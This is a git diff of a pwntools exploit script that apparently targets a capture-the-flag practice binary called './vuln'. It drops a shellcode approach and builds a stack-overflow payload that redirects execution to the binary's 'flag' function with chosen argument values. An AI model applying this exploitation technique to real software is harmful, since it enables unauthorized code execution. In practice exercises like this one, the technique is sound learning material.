@@ -12,7 +12,7 @@ continue
 '''.format(**locals())
 
 # Binary filename [CHANGE THIS]
-exe = './filename'
+exe = './vuln'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=True)
 
@@ -24,7 +24,7 @@ print(architecture)
 context.log_level = 'debug'
 
 #set prompt from program to listen for
-prompt = "" #[Change this]
+prompt = ":" #[Change this]
 
 # ===========================================================
 #                    CONFIG ENDS HERE
@@ -76,16 +76,21 @@ def main():
     io = start()
 
     #building the payload
-
+    log.info("printing elf.got")
     pprint(elf.got)
+    log.info ("printing elf.symbols")
+    pprint(elf.symbols)
 
-    jmp_esp = next(elf.search(asm("jmp esp")))
-    shellcode = asm(shellcraft.sh())
+
+    #shellcode = asm(shellcraft.sh())
 
 
     payload = flat({
         offset: [
-
+            elf.symbols['flag'],
+            0x90909090,
+            0xdeadbeef,
+            0xc0ded00d
         ]
     })
 
